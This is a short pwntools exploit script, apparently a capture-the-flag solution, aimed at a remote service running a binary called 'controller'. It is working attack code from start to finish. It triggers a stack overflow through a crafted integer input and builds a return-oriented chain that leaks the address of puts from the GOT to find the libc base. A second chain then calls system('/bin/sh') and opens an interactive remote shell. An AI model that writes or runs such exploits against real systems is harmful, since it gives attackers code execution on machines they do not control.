from pwn import *

exe = './controller'
context.binary = exe

# p = process(exe)
# libc = ELF('./libc.self')

p = remote('46.101.22.121', 31936)
libc = ELF('./libc.so.6')

elf = ELF(exe)

p.recv()
p.sendline('-65338 -1')
p.recvuntil('>')
p.sendline('3')

#offset of ret is 40
RET_OFFSET = 40

POP_RDI = 0x00000000004011d3


# gdb.attach(p)

payload = flat({
    RET_OFFSET: POP_RDI,
    RET_OFFSET + 8: elf.got['puts'],
    RET_OFFSET + 16: elf.plt['puts'],
    RET_OFFSET + 24: elf.sym['calculator']
})

p.recvuntil('>')

# gdb.attach(p, gdbscript='''
# b * 0x004010fd
# c
# ''')

p.sendlineafter(' ', payload)
p.recvuntil('\n')
leak = p.recvuntil('\n').rstrip(b'\n')
GOT_PUTS = int.from_bytes(leak, 'little')
log.info(f"GOT_PUTS @ {hex(GOT_PUTS)}")
libc.address = GOT_PUTS - libc.sym['puts']
log.info(f"Libc base {hex(libc.address)}")

BIN_SH = next(libc.search(b'/bin/sh\x00'))

# assert(libc.address == p.libs()[list(p.libs().keys())[1]])

p.recvuntil(':')
p.sendline('-65338 -1')
p.recvuntil('>')
p.sendline('3')

payload = flat({
    RET_OFFSET: POP_RDI,
    RET_OFFSET + 8: BIN_SH,
    RET_OFFSET + 16: libc.sym['system'],
    RET_OFFSET + 24: POP_RDI,
    RET_OFFSET + 32: BIN_SH,
    RET_OFFSET + 40: libc.sym['system'],
    RET_OFFSET + 48: elf.sym['calculator']
})

p.recvuntil('>')
p.sendlineafter(' ', payload)

p.interactive()

